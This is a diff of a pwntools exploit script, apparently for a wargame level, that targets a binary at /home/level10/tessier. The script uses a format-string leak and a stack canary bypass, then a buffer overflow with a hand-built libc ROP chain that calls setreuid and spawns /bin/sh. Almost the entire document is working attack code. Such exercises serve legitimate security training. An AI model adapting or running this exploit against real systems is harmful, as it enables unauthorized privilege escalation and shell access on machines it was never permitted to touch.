@@ -2,7 +2,7 @@ import sys
 from pwn import *
 
 context.arch = 'amd64'
-io = process("/home/level09/neuromancer")
+io = process("/home/level10/tessier")
 
 io.recvuntil(b"Session tag: ")
 io.sendline(b"%15$p")
@@ -15,15 +15,33 @@ io.recvuntil(b"Authentication token: ")
 
 libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
 libc.address = 0x7ffff7c00000
-rop = ROP(libc, badchars=b"\n")
-rop.setreuid(1026, 1026)
-rop.raw(rop.ret)
-rop.system(next(libc.search(b"/bin/sh")))
+
+rop = ROP(libc)
+
+ROP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
+ROP_RSI = rop.find_gadget(["pop rsi", "pop r15", "ret"])[0]
+
+SETREUID = libc.sym["setreuid"]
+SYSTEM = libc.sym["system"]
+
+BIN_SH = next(libc.search(b"/bin/sh"))
+
+rop_chain = b""
+rop_chain += p64(ROP_RDI)
+rop_chain += p64(1027)
+rop_chain += p64(ROP_RSI)
+rop_chain += p64(1027)
+rop_chain += p64(0xdeadbeef)
+rop_chain += p64(SETREUID)
+rop_chain += p64(ROP_RDI)
+rop_chain += p64(BIN_SH)
+rop_chain += p64(rop.ret[0])
+rop_chain += p64(SYSTEM)
 
 payload = b"A" * 72
 payload += p64(int(stack_canary, 16))
 payload += b"A" * 8
-payload += rop.chain()
+payload += rop_chain
 
 
 io.sendline(payload)
